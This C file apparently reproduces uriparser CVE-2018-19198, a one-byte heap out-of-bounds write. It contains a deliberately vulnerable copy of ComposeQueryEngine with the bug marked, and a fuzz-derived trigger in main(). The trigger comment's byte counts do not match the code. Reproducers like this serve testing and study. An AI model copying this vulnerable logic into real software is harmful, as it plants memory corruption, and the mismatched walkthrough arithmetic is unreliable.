/*
 * uriparser CVE-2018-19198: Out-of-bounds write in ComposeQueryEngine
 *
 * Bug (fixed in commit 864f5d4): When ComposeQueryEngine writes to a buffer
 * (dest != NULL), the variable ampersandLen is never set to 1 for the first
 * item. On the second iteration, the buffer size check uses ampersandLen=0
 * instead of ampersandLen=1, so it doesn't account for the '&' character
 * that will be written, causing an off-by-one OOB write.
 *
 * Trigger from Google Autofuzz (test case 113244572):
 *   Two query items with URL-encoded keys/values.
 *   Buffer sized exactly to charsRequired (which is off by 1 due to the bug).
 *   The '&' for the second item is written beyond the buffer.
 */

#include <stdlib.h>
#include <string.h>

typedef int UriBool;
#define URI_TRUE 1
#define URI_FALSE 0

typedef struct URI_QueryList {
    const char *key;
    const char *value;
    struct URI_QueryList *next;
} URI_QueryList;

#define URI_SUCCESS 0
#define URI_ERROR_OUTPUT_TOO_LARGE 10

/*
 * EscapeEx: URL-encodes special characters.
 * With spaceToPlus=URI_TRUE, spaces become '+'.
 * Non-printable chars become %XX (3 chars each).
 */
char *EscapeEx(const char *inFirst, const char *inAfterLast, char *out,
               UriBool spaceToPlus, UriBool normalizeBreaks) {
    const char *read = inFirst;
    char *write = out;
    (void)normalizeBreaks;
    for (;;) {
        if ((inAfterLast != NULL) && (read >= inAfterLast)) {
            return write;
        }
        if (read[0] == '\0') {
            return write;
        }
        unsigned char c = (unsigned char)read[0];
        /* Encode non-alphanumeric special chars as %XX */
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' ||
            c == '.' || c == '~') {
            write[0] = read[0];
            write++;
        } else if (spaceToPlus && c == ' ') {
            write[0] = '+';
            write++;
        } else {
            write[0] = '%';
            write[1] = "0123456789ABCDEF"[c >> 4];
            write[2] = "0123456789ABCDEF"[c & 0xF];
            write += 3;
        }
        read++;
    }
}

/*
 * VULNERABLE ComposeQueryEngine (before commit 864f5d4)
 * Bug: ampersandLen not set to 1 for first item when dest != NULL
 */
int ComposeQueryEngine(char *dest,
                       const URI_QueryList *queryList,
                       int maxChars, int *charsWritten, int *charsRequired,
                       UriBool spaceToPlus, UriBool normalizeBreaks) {
    UriBool firstItem = URI_TRUE;
    int ampersandLen = 0;
    char *write = dest;

    if (dest == NULL) {
        *charsRequired = 0;
    } else {
        maxChars--;
    }

    while (queryList != NULL) {
        const char *const key = queryList->key;
        const char *const value = queryList->value;
        const int worstCase = (normalizeBreaks == URI_TRUE ? 6 : 3);
        const int keyLen = (key == NULL) ? 0 : (int)strlen(key);
        const int keyRequiredChars = worstCase * keyLen;
        const int valueLen = (value == NULL) ? 0 : (int)strlen(value);
        const int valueRequiredChars = worstCase * valueLen;

        if (dest == NULL) {
            if (firstItem == URI_TRUE) {
                ampersandLen = 1;
                firstItem = URI_FALSE;
            }
            (*charsRequired) += ampersandLen + keyRequiredChars + ((value == NULL)
                           ? 0
                           : 1 + valueRequiredChars);
        } else {
            char *afterKey;

            if ((write - dest) + ampersandLen + keyRequiredChars > maxChars) {
                return URI_ERROR_OUTPUT_TOO_LARGE;
            }

            if (firstItem == URI_TRUE) {
                /* BUG: ampersandLen should be set to 1 here */
                firstItem = URI_FALSE;
            } else {
                write[0] = '&';  /* OOB write when buffer is exactly sized */
                write++;
            }
            afterKey = EscapeEx(key, key + keyLen,
                            write, spaceToPlus, normalizeBreaks);
            write += (afterKey - write);

            if (value != NULL) {
                char *afterValue;

                if ((write - dest) + 1 + valueRequiredChars > maxChars) {
                    return URI_ERROR_OUTPUT_TOO_LARGE;
                }

                write[0] = '=';
                write++;
                afterValue = EscapeEx(value, value + valueLen,
                                write, spaceToPlus, normalizeBreaks);
                write += (afterValue - write);
            }
        }

        queryList = queryList->next;
    }

    if (dest != NULL) {
        write[0] = '\0';
        if (charsWritten != NULL) {
            *charsWritten = (int)(write - dest) + 1;
        }
    }

    return URI_SUCCESS;
}

/*
 * Trigger: Google Autofuzz test case 113244572
 *
 * Query list: \x01=\x02 & \x11 (no value)
 * Expected output: "%01=%02&%11\0" (12 bytes)
 *
 * charsRequired calculation (vulnerable, dest==NULL path):
 *   First item: ampersandLen=1, keyRequiredChars=3*1=3, valueRequiredChars=3*1=3
 *     -> 1 + 3 + 1 + 3 = 8
 *   Second item: ampersandLen=1, keyRequiredChars=3*1=3, valueRequiredChars=0
 *     -> 1 + 3 + 0 = 4
 *   Total: 8 + 4 = 12
 *
 * But when dest!=NULL, ampersandLen stays 0 for first item.
 * On second iteration, check uses ampersandLen=0:
 *   (write - dest) + 0 + 3 > maxChars
 *   7 + 0 + 3 = 10 > 11? No (maxChars = 12-1 = 11)
 * So the check passes, but '&' is written at position 8, then key at 9-11,
 * then '\0' at position 12 — which is beyond the 12-byte buffer (indices 0-11).
 *
 * With buffer = charsRequired - 1 = 11 bytes, the check should fail but doesn't.
 */
int main(void) {
    URI_QueryList second = {NULL};
    URI_QueryList first = {NULL};

    /* \x01=\x02 & \x11 */
    second.key = "\x11";
    second.value = NULL;
    second.next = NULL;

    first.key = "\x01";
    first.value = "\x02";
    first.next = &second;

    UriBool spaceToPlus = URI_TRUE;
    UriBool normalizeBreaks = URI_FALSE;

    /* Calculate charsRequired using the vulnerable function */
    int charsRequired = 0;
    ComposeQueryEngine(NULL, &first, 0, NULL, &charsRequired,
                       spaceToPlus, normalizeBreaks);

    /* Allocate buffer = charsRequired - 1 (one byte short)
     * The vulnerable code should detect this as too small,
     * but due to the bug it doesn't, causing OOB write */
    int bufferSize = charsRequired - 1;
    char *buffer = (char *)malloc(bufferSize);
    memset(buffer, 0, bufferSize);

    /* This should return URI_ERROR_OUTPUT_TOO_LARGE but doesn't */
    int charsWritten = 0;
    int result = ComposeQueryEngine(buffer, &first, bufferSize,
                                    &charsWritten, NULL,
                                    spaceToPlus, normalizeBreaks);

    /* Use result to prevent optimization */
    volatile int v_result = result;
    volatile int v_written = charsWritten;
    (void)v_result;
    (void)v_written;

    free(buffer);
    return 0;
}
